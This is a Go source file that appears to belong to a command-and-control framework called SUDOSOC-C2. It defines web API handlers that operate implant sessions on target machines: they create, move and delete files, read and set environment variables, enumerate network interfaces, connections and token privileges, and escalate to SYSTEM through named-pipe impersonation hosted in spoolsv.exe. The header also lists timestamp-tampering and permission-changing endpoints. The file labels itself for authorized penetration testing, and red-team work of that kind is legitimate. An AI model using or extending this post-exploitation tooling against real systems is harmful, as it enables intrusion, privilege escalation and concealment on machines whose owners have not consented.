package web

/*
	SUDOSOC-C2 — Advanced Session Operations API
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Endpoints exposed here:
	  POST   /api/sessions/{id}/mkdir         — create directory on target
	  DELETE /api/sessions/{id}/rm            — delete file/dir on target
	  POST   /api/sessions/{id}/mv            — move/rename file on target
	  GET    /api/sessions/{id}/env           — list environment variables
	  POST   /api/sessions/{id}/env           — set environment variable
	  GET    /api/sessions/{id}/ifconfig      — network interfaces (real RPC)
	  GET    /api/sessions/{id}/netstat       — network connections (real RPC)
	  GET    /api/sessions/{id}/getprivs      — token privileges
	  POST   /api/sessions/{id}/getsystem     — escalate to SYSTEM/root
	  GET    /api/sessions/{id}/pwd           — print working directory
	  POST   /api/sessions/{id}/cd            — change directory
	  POST   /api/sessions/{id}/chmod         — change file permissions
	  POST   /api/sessions/{id}/chtimes       — modify file timestamps
*/

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
)

// ── Mkdir ─────────────────────────────────────────────────────────────────────

type mkdirReq struct {
	Path string `json:"path"`
}

func handleMkdir(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	var body mkdirReq
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Path == "" {
		jsonError(w, "path is required", http.StatusBadRequest)
		return
	}
	req := &sudosocpb.MkdirReq{
		Path:    body.Path,
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Mkdir{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("mkdir failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"path": resp.GetPath()})
}

// ── Rm ───────────────────────────────────────────────────────────────────────

func handleRm(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	path := r.URL.Query().Get("path")
	if path == "" {
		jsonError(w, "path query param is required", http.StatusBadRequest)
		return
	}
	recursive := r.URL.Query().Get("recursive") == "true"
	req := &sudosocpb.RmReq{
		Path:      path,
		Recursive: recursive,
		Request:   &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Rm{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("rm failed: %v", err), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

// ── Mv ───────────────────────────────────────────────────────────────────────

type mvReq struct {
	Src string `json:"src"`
	Dst string `json:"dst"`
}

func handleMv(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	var body mvReq
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Src == "" || body.Dst == "" {
		jsonError(w, "src and dst are required", http.StatusBadRequest)
		return
	}
	req := &sudosocpb.MvReq{
		Src:     body.Src,
		Dst:     body.Dst,
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Mv{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("mv failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"src": body.Src, "dst": body.Dst})
}

// ── Env ───────────────────────────────────────────────────────────────────────

type envVarJSON struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

func handleGetEnv(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	req := &sudosocpb.EnvReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.EnvInfo{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("env failed: %v", err), http.StatusInternalServerError)
		return
	}
	vars := make([]envVarJSON, 0, len(resp.GetVariables()))
	for _, v := range resp.GetVariables() {
		vars = append(vars, envVarJSON{Key: v.GetKey(), Value: v.GetValue()})
	}
	_ = json.NewEncoder(w).Encode(vars)
}

type setEnvReq struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

func handleSetEnv(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	var body setEnvReq
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || body.Key == "" {
		jsonError(w, "key is required", http.StatusBadRequest)
		return
	}
	req := &sudosocpb.SetEnvReq{
		Variable: &commonpb.EnvVar{Key: body.Key, Value: body.Value},
		Request:  &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.SetEnv{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("setenv failed: %v", err), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

// ── Ifconfig ─────────────────────────────────────────────────────────────────

type ifaceJSON struct {
	Name        string   `json:"name"`
	HwAddr      string   `json:"hw_addr"`
	IPAddresses []string `json:"ip_addresses"`
}

func handleIfconfig(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	req := &sudosocpb.IfconfigReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Ifconfig{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("ifconfig failed: %v", err), http.StatusInternalServerError)
		return
	}
	ifaces := make([]ifaceJSON, 0, len(resp.GetNetInterfaces()))
	for _, iface := range resp.GetNetInterfaces() {
		addrs := make([]string, 0, len(iface.GetIPAddresses()))
		for _, a := range iface.GetIPAddresses() {
			addrs = append(addrs, a)
		}
		ifaces = append(ifaces, ifaceJSON{
			Name:        iface.GetName(),
			HwAddr:      iface.GetMAC(),
			IPAddresses: addrs,
		})
	}
	_ = json.NewEncoder(w).Encode(ifaces)
}

// ── Netstat ──────────────────────────────────────────────────────────────────

type socketJSON struct {
	LocalAddr  string `json:"local_addr"`
	PeerAddr   string `json:"peer_addr"`
	Protocol   string `json:"protocol"`
	SkState    string `json:"state"`
	UID        uint32 `json:"uid"`
}

func handleNetstat(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	req := &sudosocpb.NetstatReq{
		UDP:      true,
		TCP:      true,
		IP4:      true,
		IP6:      true,
		Listening: true,
		Request:  &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Netstat{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("netstat failed: %v", err), http.StatusInternalServerError)
		return
	}
	sockets := make([]socketJSON, 0, len(resp.GetEntries()))
	for _, e := range resp.GetEntries() {
		sockets = append(sockets, socketJSON{
			LocalAddr: e.GetLocalAddr().GetIp() + ":" + fmt.Sprintf("%d", e.GetLocalAddr().GetPort()),
			PeerAddr:  e.GetRemoteAddr().GetIp() + ":" + fmt.Sprintf("%d", e.GetRemoteAddr().GetPort()),
			Protocol:  e.GetProtocol(),
			SkState:   e.GetSkState(),
			UID:       e.GetUID(),
		})
	}
	_ = json.NewEncoder(w).Encode(sockets)
}

// ── GetPrivs ─────────────────────────────────────────────────────────────────

type privJSON struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Enabled     bool   `json:"enabled"`
}

func handleGetPrivs(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	req := &sudosocpb.GetPrivsReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.GetPrivs{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("getprivs failed: %v", err), http.StatusInternalServerError)
		return
	}
	privs := make([]privJSON, 0, len(resp.GetPrivInfo()))
	for _, p := range resp.GetPrivInfo() {
		privs = append(privs, privJSON{
			Name:        p.GetName(),
			Description: p.GetDescription(),
			Enabled:     p.GetEnabled(),
		})
	}
	_ = json.NewEncoder(w).Encode(privs)
}

// ── GetSystem ────────────────────────────────────────────────────────────────
// Uses InvokeGetSystemReq (implant-side getsystem via named-pipe impersonation).

func handleGetSystem(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	// InvokeGetSystemReq: Data=shellcode (nil = use built-in technique),
	// HostingProcess = process to spawn for impersonation.
	req := &sudosocpb.InvokeGetSystemReq{
		HostingProcess: "spoolsv.exe",
		Request:        &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.GetSystem{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("getsystem failed: %v", err), http.StatusInternalServerError)
		return
	}
	respErr := ""
	if resp.GetResponse() != nil && resp.GetResponse().GetErr() != "" {
		respErr = resp.GetResponse().GetErr()
	}
	if respErr != "" {
		jsonError(w, "getsystem: "+respErr, http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// ── PWD ──────────────────────────────────────────────────────────────────────

func handlePWD(w http.ResponseWriter, r *http.Request) {
	session := getSession(w, r)
	if session == nil {
		return
	}
	req := &sudosocpb.PwdReq{
		Request: &commonpb.Request{SessionID: session.ID},
	}
	resp := &sudosocpb.Pwd{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		jsonError(w, fmt.Sprintf("pwd failed: %v", err), http.StatusInternalServerError)
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]string{"path": resp.GetPath()})
}
